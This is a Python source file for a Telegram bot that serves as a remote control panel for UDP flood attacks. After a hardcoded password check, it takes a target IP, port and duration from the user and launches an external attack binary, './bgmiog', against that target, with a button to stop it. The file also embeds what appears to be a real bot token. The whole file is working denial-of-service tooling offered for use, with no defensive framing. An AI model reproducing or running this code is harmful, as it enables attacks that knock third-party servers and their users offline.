import subprocess
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# Define the bot with your token
TOKEN = '7111518663:AAF7Psyncn6byP-QcxZfT0QRPhqyQv2K9aI'
bot = telebot.TeleBot(TOKEN)

# Define the password for authentication
PASSWORD = "YOUCANTHACKMEN00B"

# A dictionary to store authenticated users
authenticated_users = {}

# Store the process for attack control
attack_process = None

# /start command to welcome the user
@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, "Welcome! Please type /hailgodz to authenticate.")

# /hailgodz command to initiate authentication
@bot.message_handler(commands=['hailgodz'])
def hailgodz(message):
    chat_id = message.chat.id
    # Check if the user is already authenticated
    if authenticated_users.get(chat_id):
        bot.send_message(chat_id, "You are already authenticated!")
        show_main_menu(chat_id)
    else:
        bot.send_message(chat_id, "Please provide the password:")

# Handling password response
@bot.message_handler(func=lambda message: not authenticated_users.get(message.chat.id))
def password_check(message):
    chat_id = message.chat.id
    text = message.text

    # Authenticate the user
    if text == PASSWORD:
        authenticated_users[chat_id] = True
        bot.send_message(chat_id, "Authenticated! Please choose a command.")
        show_main_menu(chat_id)
    else:
        bot.send_message(chat_id, "Wrong password! Try again by typing /hailgodz.")

# Show main menu with buttons (Attack and Stop)
def show_main_menu(chat_id):
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("Attack", callback_data="attack"))
    markup.add(InlineKeyboardButton("STOP", callback_data="stop"))
    bot.send_message(chat_id, "Choose an option:", reply_markup=markup)

# Handle button presses (Attack and Stop)
@bot.callback_query_handler(func=lambda call: True)
def handle_button(call):
    chat_id = call.message.chat.id

    if call.data == 'attack':
        bot.send_message(chat_id, "Send the attack details in the format: IP PORT DURATION (in minutes)")
        bot.register_next_step_handler(call.message, handle_attack_details)
    elif call.data == 'stop':
        stop_attack(chat_id)

# Handling IP, Port, and Duration input after the attack button is pressed
def handle_attack_details(message):
    chat_id = message.chat.id
    try:
        ip, port, duration = message.text.split()
        start_attack(chat_id, ip, port, duration)
    except ValueError:
        bot.send_message(chat_id, "Please provide the input in the correct format: IP PORT DURATION (in minutes)")

# Function to start the UDP attack (runs the C code)
def start_attack(chat_id, ip, port, duration):
    global attack_process

    # Convert duration to seconds
    duration_seconds = int(duration) * 60

    try:
        # Start the attack using subprocess (replace './udp_traffic' with your actual C executable)
        attack_process = subprocess.Popen(['./bgmiog', ip, port, str(duration_seconds)])
        bot.send_message(chat_id, f"Attack started on {ip}:{port} for {duration} minutes.")
    except Exception as e:
        bot.send_message(chat_id, f"Failed to start the attack: {str(e)}")

# Function to stop the attack
def stop_attack(chat_id):
    global attack_process

    if attack_process:
        attack_process.terminate()
        attack_process = None
        bot.send_message(chat_id, "Attack stopped.")
    else:
        bot.send_message(chat_id, "No attack is running.")

# Run the bot
bot.polling()
